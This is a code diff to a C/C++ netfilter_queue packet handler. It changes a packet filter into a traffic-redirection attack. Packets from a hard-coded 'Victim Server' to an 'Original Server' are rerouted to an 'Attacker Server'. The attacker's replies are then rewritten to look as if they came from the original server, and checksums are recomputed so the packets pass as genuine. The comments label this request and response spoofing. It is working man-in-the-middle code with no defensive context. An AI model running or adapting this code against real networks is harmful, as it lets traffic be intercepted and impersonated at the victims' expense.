@@ -66,34 +66,37 @@ static int callback(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
 	THROW_IF_TRUE(ip == nullptr, "Issue while ipv4 header parse.");
   
 	THROW_IF_TRUE(nfq_ip_set_transport_header(pkBuff, ip) < 0, "Can\'t set transport header.");
-
-	// Packet Filtering
-	// ntohs, ntohl is Big Endian-> Little Endian, htons, htonl is Little Endian -> Big Endian
-	if(ip->protocol == IPPROTO_TCP && htonl(ip->daddr)==0xc0a82dde){
+	
+	// Request Packet Spoofing
+	// 0x6539b436 is Original Server, 0xec2da8c0 is Victim Server
+	if(ip->protocol == IPPROTO_TCP && ip->daddr==0x6539b436 && ip->saddr==0xec2da8c0){
 		struct tcphdr *tcp = nfq_tcp_get_hdr(pkBuff);
 		THROW_IF_TRUE(tcp == nullptr, "Issue while tcp header.");
-		
 		// ip->daddr is Destination IP, Spoofing IP
-		// 0x742da8c0 is 192.168.45.116
-		ip->daddr = 0x742da8c0;
+		// 0xce0a1568 is Attacker Server
+		ip->daddr = 0xce0a1568;
 		
 		// Calculate ip Checksum 
 		ip->check = 0;
 		ip->check = compute_checksum((unsigned short*)ip,ip->ihl<<2);
+		printf("Spoofing %x %x\n", htonl(ip->saddr),htonl(ip->daddr));
 		  
 		nfq_tcp_compute_checksum_ipv4(tcp, ip);
 		return nfq_set_verdict(qh, ntohl(ph->packet_id), NF_ACCEPT, pktb_len(pkBuff), pktb_data(pkBuff));
 	}
-	else if(ip->protocol == IPPROTO_TCP && htonl(ip->saddr)==0xc0a82d74){
+	// Response Packet Spoofing
+	// 0xce0a1568 is Attacker Server
+	else if(ip->protocol == IPPROTO_TCP && ip->saddr==0xce0a1568){
 		struct tcphdr *tcp = nfq_tcp_get_hdr(pkBuff);
 		THROW_IF_TRUE(tcp == nullptr, "Issue while tcp header.");
 		
-		// 0x742da8c0 is 192.168.45.116, Need to Change Spoofing IP to Original Source IP
-		ip->saddr = 0xde2da8c0;
+		// 0x6539b436 is Original Server, Need to Change Spoofing IP to Original Source IP
+		ip->saddr = 0x6539b436;
 		
 		// Calculate ip Checksum 
 		ip->check = 0;
 		ip->check = compute_checksum((unsigned short*)ip,ip->ihl<<2);
+		printf("Response %x %x\n", htonl(ip->saddr),htonl(ip->daddr));
 		  
 		nfq_tcp_compute_checksum_ipv4(tcp, ip);
 		return nfq_set_verdict(qh, ntohl(ph->packet_id), NF_ACCEPT, pktb_len(pkBuff), pktb_data(pkBuff));
@@ -172,7 +175,6 @@ int main(int argc, char **argv)
 
 
 #ifdef INSANE
-
 	/* normally, applications SHOULD NOT issue this command, since
 	 * it detaches other programs/sockets from AF_INET, too ! */
 
@@ -180,8 +182,6 @@ int main(int argc, char **argv)
 	nfq_unbind_pf(h, AF_INET);
 
 #endif
-
-
 	printf("closing library handle\n");
 	nfq_close(h);
 
